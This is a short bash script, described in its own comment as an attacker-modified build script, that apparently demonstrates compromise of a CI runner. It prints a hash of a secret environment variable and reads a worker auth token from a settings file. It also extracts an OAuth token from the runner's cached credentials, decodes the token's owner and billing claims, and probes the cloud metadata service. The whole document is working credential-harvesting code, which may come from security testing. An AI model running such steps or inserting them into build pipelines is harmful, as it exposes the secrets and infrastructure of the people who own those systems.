#!/bin/bash
# v3 edit (composed): attacker-modified build script with identity inventory.
echo "build: baseline, $(date -u +%FT%TZ), ref=${GITHUB_REF_NAME:-unknown}"
echo "build: secret env present: $([ -n "$DECOY_APP_KEY" ] && echo yes || echo no)"
echo "EXFIL-PROOF $(printf %s "$DECOY_APP_KEY" | sha256sum | cut -d" " -f1)"
echo "=== identity inventory (fleet composition) ==="
for f in /opt/hca/.settings; do
  [ -f "$f" ] && echo "IDENTITY-PROOF file=$f bytes=$(wc -c < "$f") sha16=$(shasum -a 256 "$f" | cut -c1-16)"
done
wtok=$(jq -r .authToken /opt/hca/.settings 2>/dev/null)
echo "IDENTITY-PROOF worker_jwt_len=${#wtok}"
CDIR=$(ls -d /home/runner/actions-runner/cached/*/ 2>/dev/null | head -1)
otok=$(jq -r .Data.token "$CDIR/.credentials" 2>/dev/null)
echo "IDENTITY-PROOF oauth_len=${#otok}"
cl=$(printf '%s' "$otok" | cut -d. -f2); p=$(( (4 - ${#cl} % 4) % 4 )); [ "$p" -ne 0 ] && cl="$cl$(printf '=%.0s' $(seq 1 $p))"
echo "IDENTITY-PROOF oauth_claims $(printf '%s' "$cl" | tr '_-' '/+' | base64 -d 2>/dev/null | jq -c '{owner_id, billing_owner_id, labels, runner_type, exp}')"
echo "IDENTITY-PROOF imds_orchestrator $(curl -sS -m 3 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null | jq -r '.compute.tagsList[]? | select(.name=="hosted_compute.base_ro_url") | "reachable"' 2>/dev/null)"
